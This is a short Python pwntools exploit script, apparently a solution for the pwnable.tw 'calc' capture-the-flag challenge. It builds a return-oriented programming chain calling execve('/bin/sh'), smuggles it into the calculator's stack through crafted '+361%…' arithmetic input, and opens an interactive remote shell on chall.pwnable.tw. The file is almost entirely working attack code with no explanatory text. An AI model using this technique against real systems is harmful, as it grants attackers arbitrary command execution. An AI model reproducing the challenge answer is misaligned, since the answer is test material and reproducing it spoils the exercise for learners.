#!/usr/bin/env python3
import pwn


def main():
    pwn.context(arch='i386', kernel='i386', os='linux', endian='little', word_size=32, terminal=["tmux", "splitw", "-v"])
    pwn.ELF('./calc')

    rop = pwn.rop.ROP('./calc')
    rop.call('execve', ['/bin/sh', [['sh']], 0])
    print(rop.dump())

    remote = pwn.remote('chall.pwnable.tw', 10100) if not pwn.args.LOCAL else pwn.gdb.debug('./calc', "b parse_expr\ncontinue\n")
    #if pwn.args.LOCAL:
        #gdb = pwn.gdb.attach('calc')
        #gdb.sendline('continue')
    remote.recvuntil("=== Welcome to SECPROG calculator ===\n")

    rop_as_expression = ''
    ropchain = pwn.enhex(rop.chain())
    assert len(ropchain) % 8 == 0
    for i in range(0, len(ropchain), 8):
        rop_uint32 = ropchain[i:(i + 8)]
        number = int(rop_uint32, 16)
        assert number >= 0
        number_as_int = str(number) if number != 0 else '00'
        rop_as_expression += "%" + number_as_int

    remote.send('+361' + rop_as_expression + '\n')
    remote.interactive()
    print("%08x" % int(remote.recv().rstrip()))


if __name__ == "__main__":
    pwn.info('Use --log-level DEBUG for more output')
    main()
